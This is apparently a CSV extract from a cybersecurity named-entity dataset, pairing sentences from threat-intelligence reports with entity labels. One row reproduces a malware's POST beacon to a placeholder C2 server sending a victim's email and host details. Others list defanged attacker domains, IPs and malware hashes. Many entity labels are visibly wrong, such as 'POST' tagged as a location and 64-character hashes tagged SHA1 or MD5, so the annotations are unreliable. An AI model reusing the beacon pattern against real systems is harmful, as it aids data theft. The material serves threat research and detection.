,index,text,entities,relations,Comments,id,label,start_offset,end_offset
119,8342,"POST http://{C2}/?Key={GUID}&Crc={Identifier} { ""appName"": ""Gmail Downloader"", ""targetname"": ""{Email}"", ""HostName"": ""REDACTED"", ""srcUserIP"": ""REDACTED"", ""actionType"": ""First"", ""timeOccurrence"": ""05/01/2022 05:50:31 PM"", ""OS"": ""REDACTED"", ""OSVersion"": ""REDACTED"", ""SystemModel"": ""REDACTED"", ""SystemType"": ""REDACTED"", ""srcName"": ""REDACTED"", ""srcOrgName"": ""REDACTED"" }","[{'id': 25679, 'label': 'location', 'start_offset': 0, 'end_offset': 4}, {'id': 25680, 'label': 'URL', 'start_offset': 5, 'end_offset': 44}, {'id': 25682, 'label': 'TIME', 'start_offset': 206, 'end_offset': 217}]",[],[],25679.0,location,0.0,4.0
120,3245,"It must be noted that “vbccsb” is the default username on ThreatBook Cloud Sandbox, a popular alternative to VirusTotal in China.","[{'id': 48364, 'label': 'location', 'start_offset': 123, 'end_offset': 128}, {'id': 48365, 'label': 'SOFTWARE', 'start_offset': 109, 'end_offset': 119}, {'id': 48366, 'label': 'SOFTWARE', 'start_offset': 58, 'end_offset': 82}]",[],[],48364.0,location,123.0,128.0
121,475," Because DGA is a technique the fuels malware attacks, the things you can do to help prevent malware can also help prevent DGA-fueled malware attacks:  In addition, new technologies are being developed that can more directly counter DGA-fueled attacks, particularly for organizations.",[],[],[],,,,
122,1471,"Under no circumstances should developers ever use private keys that are publicly available, nor should users download them.",[],[],[],,,,
123,7109,It is probably installed as a service named “TrkWkss.”,[],[],[],,,,
124,13205,  Figure 9.,[],[],[],,,,
125,8901,"In this particular attack, we observed that to perform lateral movement, the attacker mapped Windows admin shares and used remotely created scheduled tasks to launch malware.","[{'id': 27512, 'label': 'attack-pattern', 'start_offset': 93, 'end_offset': 113}, {'id': 27513, 'label': 'location', 'start_offset': 114, 'end_offset': 117}]",[],[],27512.0,attack-pattern,93.0,113.0
126,4322,     Figure 2. Malicious document containing macros     ,"[{'id': 50126, 'label': 'attack-pattern', 'start_offset': 15, 'end_offset': 33}]",[],[],50126.0,attack-pattern,15.0,33.0
127,4363,Users should always be wary and avoid clicking on any link or downloading any file from unsolicited emails or suspicious sources.,"[{'id': 50146, 'label': 'attack-pattern', 'start_offset': 62, 'end_offset': 128}]",[],[],50146.0,attack-pattern,62.0,128.0
128,6424,"We believe (with moderate confidence) that this newly identified activity is connected to MuddyWater (also known as TEMP.Zagros, Static Kitten, Seedworm).","[{'id': 19994, 'label': 'location', 'start_offset': 26, 'end_offset': 36}, {'id': 19995, 'label': 'threat-actor', 'start_offset': 90, 'end_offset': 100}, {'id': 19996, 'label': 'threat-actor', 'start_offset': 116, 'end_offset': 127}, {'id': 19997, 'label': 'threat-actor', 'start_offset': 129, 'end_offset': 142}, {'id': 19998, 'label': 'threat-actor', 'start_offset': 144, 'end_offset': 152}]",[],[],19994.0,location,26.0,36.0
129,13592,     Figure 7.,[],[],[],,,,
130,2692,"  LockBit 2.0 and its evolution over time is a perfect example to illustrate the persistence, increasing complexity and impact brought by the ransomware landscape as a whole.","[{'id': 47926, 'label': 'attack-pattern', 'start_offset': 2, 'end_offset': 13}]",[],[],47926.0,attack-pattern,2.0,13.0
131,1829,"However, these components were detected and deleted.",[],[],[],,,,
132,2519, We’ve followed Conti for more than a year through our work helping organizations respond to ransomware attacks.,"[{'id': 47715, 'label': 'threat-actor', 'start_offset': 16, 'end_offset': 21}]",[],[],47715.0,threat-actor,16.0,21.0
133,4467,"iPhone users could be compromised by receiving a malicious iMessage text, without ever needing to click a malicious link.","[{'id': 50257, 'label': 'SOFTWARE', 'start_offset': 59, 'end_offset': 67}]",[],[],50257.0,SOFTWARE,59.0,67.0
134,4548,"TAG continues to disrupt campaigns from multiple sets of Russian government-backed attackers, some of which are detailed in our previous updates.","[{'id': 50347, 'label': 'identity', 'start_offset': 0, 'end_offset': 3}, {'id': 50348, 'label': 'threat-actor', 'start_offset': 57, 'end_offset': 92}]",[],[],50347.0,identity,0.0,3.0
135,14362,"The connection of Maikspy variants to 198[.]12[.]155[.]84, hxxp://roundyearfun[.]org/, and 192[.]169[.]217[.]55.","[{'id': 51782, 'label': 'URL', 'start_offset': 59, 'end_offset': 85}, {'id': 44365, 'label': 'IPV4', 'start_offset': 38, 'end_offset': 57}, {'id': 44367, 'label': 'IPV4', 'start_offset': 91, 'end_offset': 111}]",[],[],51782.0,URL,59.0,85.0
136,8122,"After its launch, the app asks the user to enable accessibility.",[],[],[],,,,
137,4149,"Configuration for FRP fast reverse proxy      Chisel is a fast TCP/UDP tunnel, which is mainly used for passing through firewalls.","[{'id': 12469, 'label': 'malware', 'start_offset': 18, 'end_offset': 21}, {'id': 12470, 'label': 'malware', 'start_offset': 46, 'end_offset': 52}]",[],[],12469.0,malware,18.0,21.0
138,12234,We terminated 123 YouTube channels as part of our investigation into coordinated influence operations linked to Russia.,[],[],[],,,,
139,6210,It then registers the uploaded script to the user’s Service Worker before removing it from the server immediately after registration.,[],[],[],,,,
140,5696,An overview of Earth Lusca’s infrastructure      Social Engineering and Vulnerability Exploitation techniques,"[{'id': 17572, 'label': 'threat-actor', 'start_offset': 15, 'end_offset': 26}, {'id': 17573, 'label': 'location', 'start_offset': 68, 'end_offset': 71}]",[],[],17572.0,threat-actor,15.0,26.0
141,4316,The sender address impersonates a service similar to that on the first email (alert@ispr.gov.pk).       Figure 1.,"[{'id': 12964, 'label': 'EMAIL', 'start_offset': 78, 'end_offset': 95}]",[],[],12964.0,EMAIL,78.0,95.0
142,3266,It will be attached in each of commands sent from the server and will also be used as the folder name on a cloud storage service to save the stolen data.,[],[],[],,,,
143,2903,= 3968066955;,[],[],[],,,,
144,10439,The ransomware was effectively blocked before the IOCs were added to our backend detection pattern.,[],[],[],,,,
145,10119,MSIL.SUNBURST.A,[],[],[],,,,
146,1192,"A primary reason for the popularity of SMS-based IAP is that it does not require Internet connectivity, just cell service.",[],[],[],,,,
147,3581,"From the previous code section, we can see the default attribute added by ConfuserEx is “ConfusedBy”.","[{'id': 49363, 'label': 'tools', 'start_offset': 74, 'end_offset': 84}]",[],[],49363.0,tools,74.0,84.0
148,2057," Additionally, we observed the initial email being linked to a GitHub account (Figure 16), as well as various forums including XSS, a known Russian-speaking hacking forum created to share knowledge about exploits, vulnerabilities, malware and network penetration.","[{'id': 47147, 'label': 'attack-pattern', 'start_offset': 127, 'end_offset': 130}, {'id': 47148, 'label': 'SOFTWARE', 'start_offset': 63, 'end_offset': 69}]",[],[],47147.0,attack-pattern,127.0,130.0
149,6241,"Indicators of Compromise  Indicator  Description  Detection  mail2000tw[.]com  Domain operated by Earth Wendigo     bf[.]mail2000tw[.]com  Domain operated by Earth Wendigo     admin[.]mail2000tw[.]com  Domain operated by Earth Wendigo     googletwtw[.]com  Domain operated by Earth Wendigo     bf[.]googletwtw[.]com  Domain operated by Earth Wendigo     ws[.]googletwtw[.]com  Domain operated by Earth Wendigo     admin[.]googletwtw[.]com  Domain operated by Earth Wendigo     anybodyopenfind[.]com  Domain operated by Earth Wendigo     support[.]anybodyopenfind[.]com  Domain operated by Earth Wendigo     supports[.]anybodyopenfind[.]com  Domain operated by Earth Wendigo     supportss[.]anybodyopenfind[.]com  Domain operated by Earth Wendigo     a61e84ac9b9d3009415c7982887dd7834ba2e7c8ea9098f33280d82b9a81f923  Earth Wendigo XSS attack script  Trojan.JS.WENDIGOE.A  66cf12bb9b013c30f9db6484caa5d5d0a94683887cded2758886aae1cb5c1c65  Earth Wendigo XSS attack script  Trojan.JS.WENDIGOE.A  4cdaca6b01f52092a1dd30fc68ee8f6d679ea6f7a21974e4a3eb8d14be6f5d74  Earth Wendigo XSS attack script  Trojan.JS.WENDIGOE.A  f50a589f3b3ebcc326bab55d1ef271dcec372c25d65f381a409ea85929a34b49  Earth Wendigo XSS attack script  Trojan.JS.WENDIGOE.A  e047aa878f9e7a55a80cc1b70d0ac9840251691e91ab6454562afbff427b0879  Earth Wendigo XSS attack script  Trojan.JS.WENDIGOE.A  a1a6dc2a6c795fc315085d00aa7fdabd1f043b28c68d4f98d4152fe539f026f1  Earth Wendigo XSS attack script  Trojan.JS.WENDIGOE.A  10d2158828b953ff1140376ceb79182486525fd14b98f743dafa317110c1b289  Earth Wendigo XSS attack script  Trojan.JS.WENDIGOE.A  0e04a03afa5b66014457136fb4d437d51da9067dc88452f9ebd098d10c97c5b8  Earth Wendigo XSS attack script  Trojan.JS.WENDIGOE.A  75f3f724a2bfda1e74e0de36ff6a12d3f2ea599a594845d7e6bc7c76429e0fa4  Earth Wendigo XSS attack script  Trojan.JS.WENDIGOE.A  c3bc364409bb0c4453f6d80351477ff8a13a1acdc5735a9dff4ea4b3f5ad201c  Earth Wendigo XSS attack script  Trojan.JS.WENDIGOE.A  5251087bb2a0c87ac60c13f2edb7c39fb1ea26984fcc07e4cf8b39db31ce2b08  Earth Wendigo XSS attack script  Trojan.JS.WENDIGOE.A  7fa9a58163dd233065a86f9ed6857ed698fc6e454e6b428ea93f4f711279fb61  Earth Wendigo XSS attack script  Trojan.JS.WENDIGOE.A  f568f823959be80a707e05791718c1c3c377da1b0db1865821c1cf7bc53b6084  Earth Wendigo XSS attack script  Trojan.JS.WENDIGOE.A  a54d58d5a5812abaede3e2012ae757d378fb51c7d3974eaa3a3f34511161c1db  Earth Wendigo XSS attack script  Trojan.JS.WENDIGOE.A  77c3d62cce21c2c348f825948042f7d36999e3be80db32ac98950e88db4140b1  Earth Wendigo XSS attack script  Trojan.JS.WENDIGOE.A  ﻿c0dabb52c73173ea0b597ae4ad90d67c23c85110b06aa3c9e110a852ebe04420  Earth Wendigo Service Worker script  Trojan.JS.WENDIGOE.A  efe541889f3da7672398d7ad00b8243e94d13cc3254ed59cd547ad172c1aa4be  Earth Wendigo WebSocket JavaScript backdoor  Backdoor.JS.WENDIGOE.A  2411b7b9ada83f6586278e0ad36b42a98513c9047a272a5dcb4a2754ba8e6f1d  Earth Wendigo Shellcode Loader  Trojan.Win32.WENDIGOE.A  1de54855b15fc55b4a865723224119029e51b381a11fda5d05159c74f50cb7de  Earth Wendigo Shellcode Loader  Trojan.Win32.WENDIGOE.A  d935c9fe8e229f1dabcc0ceb02a9ce7130ae313dd18de0b1aca69741321a7d1b  Earth Wendigo Shellcode Loader  Trojan.Win32.WENDIGOE.B  50f23b6f4dff77ce4101242ebc3f12ea40156a409a7417ecf6564af344747b76  Earth Wendigo Shellcode Loader  Trojan.Win32.WENDIGOE.C    fab0c4e0992afe35c5e99bf9286db94313ffedc77d138e96af940423b2ca1cf2  Earth Wendigo Shellcode Loader  Trojan.Win32.WENDIGOE.C    4d9c63127befad0b65078ccd821a9cd6c1dccec3e204a253751e7213a2d39e39  Earth Wendigo Shellcode Loader  Trojan.Win32.WENDIGOE.C    25258044c838c6fc14a447573a4a94662170a7b83f08a8d76f96fbbec3ab08e2  Earth Wendigo Shellcode Loader  Trojan.Win32.WENDIGOE.C    13952e13d310fb5102fd4a90e4eafe6291bc97e09eba50fedbc2f8900c80165f  Earth Wendigo Shellcode Loader  Trojan.Win32.WENDIGOE.C    ccb7be5a5a73104106c669d7c58b13a55eb9db3b3b5a6d3097ac8b68f2555d39  Earth Wendigo Shellcode Loader  Trojan.Win64.WENDIGOE.A    40a251184bb680edadfa9778a37135227e4191163882ccf170835e0658b1e0ed  Earth Wendigo Shellcode Loader  Trojan.Win64.WENDIGOE.B    0d6c3cc46be2c2c951c24c695558be1e2338635176fa34e8b36b3e751ccdb0de  Cobalt Strike  Trojan.Win32.COBALT.SM       Tags  Articles, News, Reports | APT & Targeted Attacks | Research","[{'id': 19254, 'label': 'threat-actor', 'start_offset': 98, 'end_offset': 111}, {'id': 19255, 'label': 'threat-actor', 'start_offset': 158, 'end_offset': 171}, {'id': 19256, 'label': 'threat-actor', 'start_offset': 221, 'end_offset': 234}, {'id': 19257, 'label': 'threat-actor', 'start_offset': 276, 'end_offset': 289}, {'id': 19258, 'label': 'threat-actor', 'start_offset': 336, 'end_offset': 349}, {'id': 19259, 'label': 'threat-actor', 'start_offset': 396, 'end_offset': 409}, {'id': 19260, 'label': 'threat-actor', 'start_offset': 459, 'end_offset': 472}, {'id': 19261, 'label': 'threat-actor', 'start_offset': 519, 'end_offset': 532}, {'id': 19262, 'label': 'threat-actor', 'start_offset': 589, 'end_offset': 602}, {'id': 19263, 'label': 'threat-actor', 'start_offset': 660, 'end_offset': 673}, {'id': 19264, 'label': 'threat-actor', 'start_offset': 732, 'end_offset': 745}, {'id': 19265, 'label': 'SHA1', 'start_offset': 750, 'end_offset': 814}, {'id': 19266, 'label': 'threat-actor', 'start_offset': 816, 'end_offset': 829}, {'id': 19267, 'label': 'attack-pattern', 'start_offset': 830, 'end_offset': 833}, {'id': 19268, 'label': 'SHA1', 'start_offset': 871, 'end_offset': 935}, {'id': 19269, 'label': 'threat-actor', 'start_offset': 937, 'end_offset': 950}, {'id': 19270, 'label': 'attack-pattern', 'start_offset': 951, 'end_offset': 954}, {'id': 19271, 'label': 'SHA1', 'start_offset': 992, 'end_offset': 1056}, {'id': 19272, 'label': 'threat-actor', 'start_offset': 1058, 'end_offset': 1071}, {'id': 19273, 'label': 'attack-pattern', 'start_offset': 1072, 'end_offset': 1075}, {'id': 19274, 'label': 'SHA2', 'start_offset': 1113, 'end_offset': 1177}, {'id': 19275, 'label': 'threat-actor', 'start_offset': 1179, 'end_offset': 1192}, {'id': 19276, 'label': 'attack-pattern', 'start_offset': 1193, 'end_offset': 1196}, {'id': 19277, 'label': 'SHA2', 'start_offset': 1234, 'end_offset': 1298}, {'id': 19278, 'label': 'threat-actor', 'start_offset': 1300, 'end_offset': 1313}, {'id': 19279, 'label': 'attack-pattern', 'start_offset': 1314, 'end_offset': 1317}, {'id': 19280, 'label': 'SHA2', 'start_offset': 1355, 'end_offset': 1419}, {'id': 19281, 'label': 'threat-actor', 'start_offset': 1421, 'end_offset': 1434}, {'id': 19282, 'label': 'attack-pattern', 'start_offset': 1435, 'end_offset': 1438}, {'id': 19283, 'label': 'SHA2', 'start_offset': 1476, 'end_offset': 1540}, {'id': 19284, 'label': 'threat-actor', 'start_offset': 1542, 'end_offset': 1555}, {'id': 19285, 'label': 'attack-pattern', 'start_offset': 1556, 'end_offset': 1559}, {'id': 19286, 'label': 'MD5', 'start_offset': 1597, 'end_offset': 1661}, {'id': 19287, 'label': 'threat-actor', 'start_offset': 1663, 'end_offset': 1676}, {'id': 19288, 'label': 'attack-pattern', 'start_offset': 1677, 'end_offset': 1680}, {'id': 19289, 'label': 'SHA2', 'start_offset': 1718, 'end_offset': 1782}, {'id': 19290, 'label': 'threat-actor', 'start_offset': 1784, 'end_offset': 1797}, {'id': 19291, 'label': 'attack-pattern', 'start_offset': 1798, 'end_offset': 1801}, {'id': 19292, 'label': 'SHA2', 'start_offset': 1839, 'end_offset': 1903}, {'id': 19293, 'label': 'threat-actor', 'start_offset': 1905, 'end_offset': 1918}, {'id': 19294, 'label': 'attack-pattern', 'start_offset': 1919, 'end_offset': 1922}, {'id': 19295, 'label': 'SHA2', 'start_offset': 1960, 'end_offset': 2024}, {'id': 19296, 'label': 'threat-actor', 'start_offset': 2026, 'end_offset': 2039}, {'id': 19297, 'label': 'attack-pattern', 'start_offset': 2040, 'end_offset': 2043}, {'id': 19298, 'label': 'SHA2', 'start_offset': 2081, 'end_offset': 2145}, {'id': 19299, 'label': 'threat-actor', 'start_offset': 2147, 'end_offset': 2160}, {'id': 19300, 'label': 'attack-pattern', 'start_offset': 2161, 'end_offset': 2164}, {'id': 19301, 'label': 'SHA1', 'start_offset': 2202, 'end_offset': 2266}, {'id': 19302, 'label': 'threat-actor', 'start_offset': 2268, 'end_offset': 2281}, {'id': 19303, 'label': 'attack-pattern', 'start_offset': 2282, 'end_offset': 2285}, {'id': 19304, 'label': 'SHA1', 'start_offset': 2323, 'end_offset': 2387}, {'id': 19305, 'label': 'threat-actor', 'start_offset': 2389, 'end_offset': 2402}, {'id': 19306, 'label': 'attack-pattern', 'start_offset': 2403, 'end_offset': 2406}, {'id': 19307, 'label': 'SHA1', 'start_offset': 2444, 'end_offset': 2508}, {'id': 19308, 'label': 'threat-actor', 'start_offset': 2510, 'end_offset': 2523}, {'id': 19309, 'label': 'attack-pattern', 'start_offset': 2524, 'end_offset': 2527}, {'id': 19310, 'label': 'SHA2', 'start_offset': 2565, 'end_offset': 2630}, {'id': 19311, 'label': 'threat-actor', 'start_offset': 2632, 'end_offset': 2645}, {'id': 19312, 'label': 'SHA2', 'start_offset': 2691, 'end_offset': 2755}, {'id': 19313, 'label': 'threat-actor', 'start_offset': 2757, 'end_offset': 2770}, {'id': 19314, 'label': 'SHA1', 'start_offset': 2826, 'end_offset': 2890}, {'id': 19315, 'label': 'threat-actor', 'start_offset': 2892, 'end_offset': 2905}, {'id': 19316, 'label': 'SHA1', 'start_offset': 2949, 'end_offset': 3013}, {'id': 19317, 'label': 'threat-actor', 'start_offset': 3015, 'end_offset': 3028}, {'id': 19318, 'label': 'SHA2', 'start_offset': 3072, 'end_offset': 3136}, {'id': 19319, 'label': 'threat-actor', 'start_offset': 3138, 'end_offset': 3151}, {'id': 19320, 'label': 'SHA1', 'start_offset': 3195, 'end_offset': 3259}, {'id': 19321, 'label': 'threat-actor', 'start_offset': 3261, 'end_offset': 3274}, {'id': 19322, 'label': 'SHA1', 'start_offset': 3320, 'end_offset': 3384}, {'id': 19323, 'label': 'threat-actor', 'start_offset': 3386, 'end_offset': 3399}, {'id': 19324, 'label': 'SHA2', 'start_offset': 3445, 'end_offset': 3509}, {'id': 19325, 'label': 'threat-actor', 'start_offset': 3511, 'end_offset': 3524}, {'id': 19326, 'label': 'SHA1', 'start_offset': 3570, 'end_offset': 3634}, {'id': 19327, 'label': 'threat-actor', 'start_offset': 3636, 'end_offset': 3649}, {'id': 19328, 'label': 'SHA1', 'start_offset': 3695, 'end_offset': 3759}, {'id': 19329, 'label': 'threat-actor', 'start_offset': 3761, 'end_offset': 3774}, {'id': 19330, 'label': 'SHA2', 'start_offset': 3820, 'end_offset': 3884}, {'id': 19331, 'label': 'threat-actor', 'start_offset': 3886, 'end_offset': 3899}, {'id': 19332, 'label': 'SHA1', 'start_offset': 3945, 'end_offset': 4009}, {'id': 19333, 'label': 'threat-actor', 'start_offset': 4011, 'end_offset': 4024}, {'id': 19334, 'label': 'SHA1', 'start_offset': 4070, 'end_offset': 4134}, {'id': 19335, 'label': 'tools', 'start_offset': 4136, 'end_offset': 4149}, {'id': 19336, 'label': 'location', 'start_offset': 4212, 'end_offset': 4215}]",[],[],19254.0,threat-actor,98.0,111.0
